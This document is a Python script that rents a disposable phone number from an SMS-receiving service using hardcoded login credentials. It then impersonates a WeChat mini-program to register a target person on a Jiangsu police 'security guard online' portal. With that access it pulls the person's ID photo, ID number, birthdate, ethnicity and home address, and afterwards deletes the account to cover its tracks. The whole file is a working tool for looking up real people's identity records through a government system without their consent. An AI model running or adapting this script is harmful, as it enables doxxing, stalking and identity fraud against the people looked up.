import requests
import json
import base64
import time
import re

# 定义常量
LOGIN_API_URL = "http://api.haozhuma.com/sms/?api=login"
GET_PHONE_API_URL = "http://api.haozhuma.com/sms/?api=getPhone"
GET_MESSAGE_API_URL = "http://api.haozhuma.com/sms/?api=getMessage"
CANCEL_RECV_API_URL = "http://api.haozhuma.com/sms/?api=cancelRecv"

JSGA_SEND_SMS_URL = "https://zhza.jsga.gov.cn/bazx/ywtbPreSrv/sms/sendCommonDxyzm"
JSGA_REG_USER_URL = "https://zhza.jsga.gov.cn/bazx/ywtbSrv/ywtb//user/regUser"
JSGA_QUERY_PERSON_INFO_URL = "https://zhza.jsga.gov.cn/bazx/ywtbSrv/ywtb//grzx/queryPersonInfo"
JSGA_DELETE_USER_URL = "https://zhza.jsga.gov.cn/bazx/ywtbSrv/ywtb//user/deleteUser"

# 登录参数
LOGIN_PARAMS = {
    'user': 'li928640629',
    'pass': 'li521314995'
}

def get_token():
    response = requests.get(LOGIN_API_URL, params=LOGIN_PARAMS)
    if response.status_code == 200:
        try:
            return response.json()['token']
        except json.JSONDecodeError as e:
            print(f"JSON 解析错误: {e}")
    else:
        print(f"请求失败，状态码: {response.status_code}")
    return None

def get_phone_number(token, project_id):
    response = requests.get(f"{GET_PHONE_API_URL}&token={token}&sid={project_id}&author=LIhaiyang2")
    if response.status_code == 200:
        try:
            return response.json()['phone']
        except KeyError:
            print("错误: 响应数据中不存在 'phone' 键。")
    else:
        print(f"请求失败，状态码: {response.status_code}")
    return None

def send_sms_request(phone_number, name, id_number):
    payload = json.dumps({
        "interfaceName": "sms/getDxyzm",
        "phone": phone_number,
        "startDxyzm": "您正在注册江苏保安在线小程序，验证码：",
        "endDxyzm": "",
        "xm": name,
        "gmsfhm": id_number,
        "template_type_code": "template_type_code_1"
    })
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 9; 2101212C  Build/TKQ1.210708.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.0.0  Mobile Safari/537.36 XWEB/1150056 MMWEBSDK/20231202 MMWEBID/4656 MicroMessenger/8.0.47.2560(0x28002F30) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wx66h88hh13846hbh",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip, deflate",
        'Content-Type': "application/json",
        'Origin': "https://zhza.jsga.gov.cn",
        'X-Requested-With': "com.tencent.mm",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://zhza.jsga.gov.cn/bazx/ywtbClient/ywtbClient/",
        'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    response = requests.post(JSGA_SEND_SMS_URL, data=payload, headers=headers)
    print(response.text)

def pad_or_truncate_id(user_input_id):
    user_input_id = str(user_input_id)
    padding_length = 6 - len(user_input_id)
    if padding_length > 0:
        padded_id = user_input_id.ljust(6, '0')
    else:
        padded_id = user_input_id[:6]
    return padded_id

def get_sms_code(token, project_id, phone_number):
    attempt_count = 0
    max_attempts = 7
    while attempt_count < max_attempts:
        response = requests.get(f"{GET_MESSAGE_API_URL}&token={token}&sid={project_id}&phone={phone_number}")
        response_data = response.json()
        if response_data['msg'] == "success":
            code = response_data['yzm']
            return code
        elif response_data['msg'] in ["短信还未到达,请继续获取", "等待"]:
            time.sleep(3)
            attempt_count += 1
        else:
            print(f"发生错误: {response_data['msg']}")
            return None
    print("已达到最大尝试次数，短信可能未到达。")
    return None

def register_user(phone_number, name, id_number, code, padded_id):
    payload = json.dumps({
        "xm": name,
        "gmsfhm": id_number,
        "lxdh": phone_number,
        "xldm": "0",
        "mzdm": "1",
        "xzqhdm": padded_id,
        "xzzxz": "0",
        "wxXxzjbh": "wx66h88hh13846hbh",
        "dxyzm": code
    })
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; 2101212C  Build/TKQ1.210708.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.0.0  Mobile Safari/537.36 XWEB/1150056 MMWEBSDK/20231202 MMWEBID/4656 MicroMessenger/8.0.47.2560(0x28002F30) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wx66h88hh13846hbh",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/json",
        "Origin": "https://zhza.jsga.gov.cn",
        "X-Requested-With": "com.tencent.mm",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://zhza.jsga.gov.cn/bazx/ywtbClient/ywtbClient/",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    response = requests.post(JSGA_REG_USER_URL, data=payload, headers=headers)
    print(response.text)

def cancel_receive(token, project_id, phone_number):
    url = f"{CANCEL_RECV_API_URL}&token={token}&sid={project_id}&phone={phone_number}"
    response = requests.post(url)
    print(response.text)

def query_person_info(id_number):
    payload = json.dumps({
        "gmsfhm": id_number
    })
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 9; 2101212C  Build/TKQ1.210708.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.0.0  Mobile Safari/537.36 XWEB/1150056 MMWEBSDK/20231202 MMWEBID/4656 MicroMessenger/8.0.47.2560(0x28002F30) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wx66h88hh13846hbh",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip, deflate",
        'Content-Type': "application/json",
        'Origin': "https://zhza.jsga.gov.cn",
        'X-Requested-With': "com.tencent.mm",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://zhza.jsga.gov.cn/bazx/ywtbClient/ywtbClient/",
        'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    response = requests.post(JSGA_QUERY_PERSON_INFO_URL, data=payload, headers=headers)
    response_data = response.json()
    if 'result' in response_data and 'resultPerson' in response_data['result']:
        person_info = response_data['result']['resultPerson']
        image_base64 = person_info['XP']
        if image_base64:
            image_data = base64.b64decode(image_base64)
            name = person_info['XM']
            current_path = f"{name}.jpg"
            with open(current_path, "wb") as image_file:
                image_file.write(image_data)
            print(current_path)
        return {
            'sfzh': person_info.get('ALLGMSFHM'),
            'name': person_info.get('XM'),
            'xingbie': person_info.get('SEX'),
            'minzu': person_info.get('MZ'),
            'nyr': person_info.get('CSRQ'),
            'dizhi': person_info.get('HJDZ_QHNXXDZ')
        }
    else:
        print("未获取到人员信息")
        return None

def delete_user(id_number):
    payload = json.dumps({
        "gmsfhm": id_number
    })
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 9; 2101212C  Build/TKQ1.210708.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.0.0  Mobile Safari/537.36 XWEB/1150056 MMWEBSDK/20231202 MMWEBID/4656 MicroMessenger/8.0.47.2560(0x28002F30) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wx66h88hh13846hbh",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip, deflate",
        'Content-Type': "application/json",
        'Origin': "https://zhza.jsga.gov.cn",
        'X-Requested-With': "com.tencent.mm",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://zhza.jsga.gov.cn/bazx/ywtbClient/ywtbClient/",
        'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    response = requests.post(JSGA_DELETE_USER_URL, data=payload, headers=headers)
    print(response.text)

# 主程序逻辑
token = get_token()
if token:
    project_id = '80657'
    phone_number = get_phone_number(token, project_id)
    if phone_number:
        combined_input = input("请输入 名字的值和身份证的值，用空格分隔: ")
        pattern = r"^([\u4e00-\u9fa5]+)?\s(\d{17}[\dX])$"
        match = re.match(pattern, combined_input)
        if match:
            name = match.group(1)
            id_number = match.group(2)
            send_sms_request(phone_number, name, id_number)
            padded_id = pad_or_truncate_id(id_number)
            code = get_sms_code(token, project_id, phone_number)
            if code:
                register_user(phone_number, name, id_number, code, padded_id)
            person_info = query_person_info(id_number)
            if person_info:
                print(f"身份证: {person_info['sfzh']}")
                print(f"姓名: {person_info['name']}")
                print(f"性别: {person_info['xingbie']}")
                print(f"民族: {person_info['minzu']}")
                print(f"生日: {person_info['nyr']}")
                print(f"地址: {person_info['dizhi']}")
            delete_user(id_number)
            cancel_receive(token, project_id, phone_number)
        else:
            print("输入格式错误，请确保名字和身份证号码符合规定的格式。")
